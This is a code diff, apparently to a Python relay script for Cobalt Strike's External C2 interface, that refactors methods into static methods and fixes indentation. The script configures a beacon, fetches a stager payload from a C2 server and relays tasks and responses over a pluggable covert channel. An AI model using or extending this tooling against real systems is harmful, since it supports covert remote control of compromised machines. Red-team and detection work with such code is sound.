@@ -63,6 +63,7 @@ TRANSPORT_MODULE = "raw_socket"
 # DEBUG: </END GHETTO CONFIG>
 
 class commonUtils(object):
+	@staticmethod
 	def createSocket():
 		# Borrowed from https://github.com/outflanknl/external_c2/blob/master/python_c2ex.py
 		d = {}
@@ -70,10 +71,12 @@ class commonUtils(object):
 		d['state'] = 1
 		return (d)
 
+	@staticmethod
 	def sendFrameToC2(sock, chunk):
 		slen = struct.pack('<I', len(chunk))
 		sock.sendall(slen + chunk)
 
+	@staticmethod
 	def recvFrameFromC2(sock):
 		try:
 			chunk = sock.recv(4)
@@ -87,19 +90,23 @@ class commonUtils(object):
 			chunk = chunk + sock.recv(slen - len(chunk))
 		return(chunk)
 
+	@staticmethod
 	def killSocket(sock):
 		sock.close()
 
+	@staticmethod
 	def prepData(data):
 		# This will prepare whatever data is given based on the config
 		rdyData = encoder.encode(data)
 		return rdyData
 
+	@staticmethod
 	def decodeData(data):
 		# This will decode whatever data is given based on the config
 		rdyData = encoder.decode(data)
 		return rdyData
 
+	@staticmethod
 	def retrieveData():
 		# This will retireve data via the covert channel
 		# Returns unencoded data
@@ -116,7 +123,7 @@ class commonUtils(object):
 
 		return preped_data
 
-
+	@staticmethod
 	def sendData(data):
 		# This will upload the data via the covert channel
 		# returns a confirmation that the data has been sent
@@ -128,6 +135,7 @@ class commonUtils(object):
 
 		transport.sendData(preped_data)
 
+	@staticmethod
 	def color(string, status=True, warning=False, bold=True, yellow=False):
 		""" 
 		Change text color for the terminal, defaults to green
@@ -152,17 +160,19 @@ class commonUtils(object):
 	# TODO: add a function that handles logic for when a session exits to notify the c2 controller. Right now, this could/would only ever by killing the socket.
 	#	if the spec ever changes to support restoration for sessions, then this can become a priority.
 
+	@staticmethod
 	def importModule(modName, modType):
-	"""
-	Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
-	"""
-	prep_global = "global " + modType
-	exec(prep_global)
-	importName = "import utils." + modType + "s." + modName + " as " + modType
-	exec(importName, globals())
+		"""
+		Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
+		"""
+		prep_global = "global " + modType
+		exec(prep_global)
+		importName = "import utils." + modType + "s." + modName + " as " + modType
+		exec(importName, globals())
 
 
 class configureStage(object):
+	@staticmethod	
 	def configureOptions(sock, arch, pipename, block):
 		# send the options
 		if args.verbose:
@@ -183,6 +193,7 @@ class configureStage(object):
 			print commonUtils.color(beacon_block, status=False, yellow=True)
 		commonUtils.sendFrameToC2(sock, beacon_block)
 
+	@staticmethod
 	def requestStager(sock):
 		commonUtils.sendFrameToC2(sock, "go")
 
@@ -190,15 +201,16 @@ class configureStage(object):
 
 		return stager_payload
 
+	@staticmethod
 	def main(sock):
 		# Send options to the external_c2 server
-		self.configureOptions(sock, C2_ARCH, C2_PIPE_NAME, C2_BLOCK_TIME)
+		configureStage.configureOptions(sock, C2_ARCH, C2_PIPE_NAME, C2_BLOCK_TIME)
 
 		if args.debug:
 			print commonUtils.color("stager configured, sending 'go'", status=False, yellow=True)
 
 		# Request stager
-		stager_payload = self.requestStager(sock)
+		stager_payload = configureStage.requestStager(sock)
 
 		if args.debug:
 			print (commonUtils.color("STAGER: ", status=False, yellow=True) + "%s") % (stager_payload)
@@ -230,6 +242,7 @@ class configureStage(object):
 		return 0
 
 class establishedSession(object):
+	@staticmethod
 	def checkForTasks(sock):
 		"""
 		Poll the c2 server for new tasks
@@ -254,6 +267,7 @@ class establishedSession(object):
 		return recvdTask
 
 	#def checkForResponse(sock):
+	@staticmethod
 	def checkForResponse():
 		"""
 		Check the covert channel for a response from the client
@@ -275,6 +289,7 @@ class establishedSession(object):
 
 		return recvdResponse
 
+	@staticmethod
 	def relayResponse(sock, response):
 		# Relays the response from the client to the c2 server
 		# 'response', will have already been decoded from 'establishedSession.checkForResponse()'
@@ -283,6 +298,7 @@ class establishedSession(object):
 			print commonUtils.color("Relaying response to c2 server", status=False, yellow=True)
 		commonUtils.sendFrameToC2(sock, response)
 
+	@staticmethod
 	def relayTask(task):
 		# Relays a new task from the c2 server to the client
 		# 'task' will be encoded in the 'commonUtils.sendData()' function.
@@ -298,6 +314,7 @@ def main():
 
 
 	# Call arguments with args.$ARGNAME
+	global args
 	args = parser.parse_args()
 
 	# Enable verbose output if debug is enabled
@@ -325,6 +342,9 @@ def main():
 
 		# #####################
 
+		# Prep the transport module
+		transport.prepTransport()
+		
 		# Let's get the stager from the c2 server
 		stager_status = configureStage.main(sock)
 
